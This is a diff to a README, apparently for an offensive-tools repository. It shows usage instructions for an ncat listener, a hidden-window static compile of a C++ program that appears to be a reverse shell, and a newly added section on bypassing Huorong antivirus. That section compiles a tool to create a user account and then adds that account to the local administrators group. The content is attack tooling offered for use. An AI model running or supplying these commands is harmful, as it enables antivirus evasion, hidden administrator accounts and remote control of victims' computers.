@@ -41,4 +41,9 @@ local ethernet address && gateway ipv4 address<br>
 <code>ncat -lvp 19482</code><br>
 <code>g++ 0.cpp -o 00 -lws2_32 -s -O2 -static -static-libgcc -static-libstdc++ -mwindows</code>
 需要修改0.cpp中的RyzU1
+### bypass huorong add user account 
+##用法<br>
+<code>x86_64-w64-mingw32-g++ -o 001 火绒-命令行添加用户账户.cpp -lnetapi32 -static -static-libgcc -static-libstdc++</code><br>
+<code>001.exe</code>
+<code>net localgroup administrators DSzOO3vnAu /add</code>
 ###### 2024年12月原创于中华人民共和国浙江省宁波市
